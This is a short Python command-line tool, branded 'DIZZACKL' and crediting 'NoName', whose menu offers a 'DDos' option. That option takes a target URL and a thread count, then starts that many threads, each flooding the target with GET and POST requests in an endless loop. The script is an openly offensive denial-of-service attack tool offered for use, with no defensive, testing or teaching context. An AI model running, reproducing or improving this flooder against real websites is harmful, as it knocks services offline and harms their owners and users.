#========================import===============================
import requests
from threading import Thread

#========================banner===============================
banner = """
██████╗ ██╗███████╗███████╗ █████╗  ██████╗██╗  ██╗██╗
██╔══██╗██║╚══███╔╝╚══███╔╝██╔══██╗██╔════╝██║ ██╔╝██║
██║  ██║██║  ███╔╝   ███╔╝ ███████║██║     █████╔╝ ██║
██║  ██║██║ ███╔╝   ███╔╝  ██╔══██║██║     ██╔═██╗ ██║
██████╔╝██║███████╗███████╗██║  ██║╚██████╗██║  ██╗███████╗
╚═════╝ ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
"""
print(banner)

#========================menu=================================
menu = """
|--------------------|
|[1]Info    [2]exit  |
|=====[3]DDos========|
|--------------------|
"""
print(menu)

#=======================Select================================
user_input = input('Select:')

#========================Info=================================
if user_input == '1':
    infomenu = """
|==================|
|made by developer |
|DIZZACKL. with the|
|support of || NN -|
|NoName ||         |
|==================|
"""
    print(infomenu)

#========================exit=================================
elif user_input == '2':
    print('\n\nPress ENTER to exit')
    exit()

#========================DDos=================================
elif user_input == '3':
    url = input('Enter web address: ')
    thrnom = int(input('Number of requests: '))

    def make_requests():
        while True:
            try:
                resp_post = requests.post(url)
                resp_get = requests.get(url)
                print(f'Response codes: POST - {resp_post.status_code}, GET - {resp_get.status_code}')
            except requests.exceptions.RequestException as e:
                print(f'Error: {e}')
                exit()

    for i in range(thrnom):
        thr = Thread(target=make_requests)
        thr.start()

    print('Multiple requests running...')
